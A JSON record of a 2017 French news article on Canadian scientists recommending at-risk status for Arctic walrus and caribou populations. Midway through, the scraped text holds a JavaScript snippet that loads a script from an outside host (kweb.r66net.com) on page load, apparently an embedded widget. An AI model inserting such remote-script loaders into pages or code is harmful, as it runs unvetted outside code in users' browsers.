{"title": "Biodiversite : pourquoi les morses et les caribous disparaissent-ils ?", "newspaper": "Futura Sciences", "author": ["MONTREAL-AFP"], "date_publi": "2017-05-08", "content": "Plusieurs populations de morses et de caribous des regions arctiques d'Amerique du nord devraient etre considerees comme en voie de disparition selon des scientifiques canadiens. Le rechauffement climatique rapide, avec recul des glaces et modification du couvert vegetal, figure parmi les causes de ce declin, aux cotes du tourisme et de l'expansion des industries. Ce qu'il faut retenir Au Canada, un suivi des populations montre un declin des effectifs de mammiferes, dont les morses et les caribous dans les regions arctiques. Les causes reconnues sont le rechauffement climatique et les activites humaines. Les deux derniers troupeaux de  morses  du Canada et une enieme harde de caribous  << sont menaces de disparition >>  dans l'Arctique, a annonce le 1er mai un comite d'experts scientifiques charge de conseiller le gouvernement. Le nombre d' especes  sauvages du nord canadien considerees comme etant en peril atteint maintenant 62 especes, a indique le Comite sur la situation des especes en peril au Canada (Cosepac) a l'issue de sa reunion bisannuelle.  << Au cours des dernieres decennies, les aires habitees par les quelques milliers de  morses  du Haut-Arctique et par la population plus nombreuse du centre de l'Arctique et du Bas-Arctique ont fait l'objet d'une reduction qui d'ailleurs se poursuit >> , a indique le Cosepac. Le comite recommande que ces deux populations soient classees sous statut d'espece  << preoccupante >> , compte tenu des menaces qui pesent sur elles :  rechauffement climatique , recul de la glace de mer, interactions plus frequentes avec les touristes, developpement industriel. Un tel statut obligerait le gouvernement a prendre des mesures pour contrer le declin des troupeaux.  << Les morses ont ete tres importants pour les  Inuits , a la fois comme nourriture et dans leur culture, et le demeurent encore a ce jour. Les morses sont particulierement vulnerables aux perturbations et meritent certainement une attention particuliere >> , a souligne l'expert en  mammiferes  marins du comite, Hal Whitehead. Le caribou est la version quebecoise du renne ( Rangifer tarandus ), cervide des regions arctiques de l'Europe, de l'Asie et de l'Amerique du Nord. Certaines sous-especes ont une diversite si faible qu'elles seraient incapables de s'adapter au changement climatique.(c) Alexandre Buisse, Wikipedia, GNU 1.2                               Plusieurs hardes de caribous se depeuplent Le comite a aussi examine pour la premiere fois le sort du caribou  migrateur  de l'est,  << celebre harde >>  de la riviere George au Quebec et au Labrador qui comptait plus de 800.000 tetes en 1993 et dont il ne reste plus que  << quelques milliers d'animaux >> . Le statut d'espece  << en voie de disparition >>  a ete recommande pour cette espece de  renne , ainsi que pour une deuxieme harde qui connait egalement  << un grave declin >> , selon le Cosepac. Un expert du comite, Graham Forbes, a souligne la vulnerabilite du caribou aux activites humaines, une situation que vient compliquer le  << changement climatique rapide dans le nord >> .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Voir aussi : Les rennes du pere Noel sont menaces par le climat << Les arbustes couvrent de plus en plus des paysages autrefois domines par le lichen, source de nourriture principale du caribou en hiver ; et la surexploitation se poursuit. Nous sommes preoccupes par le fait que ces facteurs puissent rendre tres difficile le retablissement des hardes >> , a explique Graham Forbes. En decembre, le comite avait juge  << menace >>  le troupeau de la  toundra  et classe  << en voie de disparition >>  celui des monts Torngat, aux confins de l'Arctique quebecois et du Labrador.  << Une partie du nord canadien se rechauffe plus rapidement que partout ailleurs dans le monde, et le nombre d'especes en peril dans le nord est en croissance >> , a souligne le comite. ", "theme": "planete"}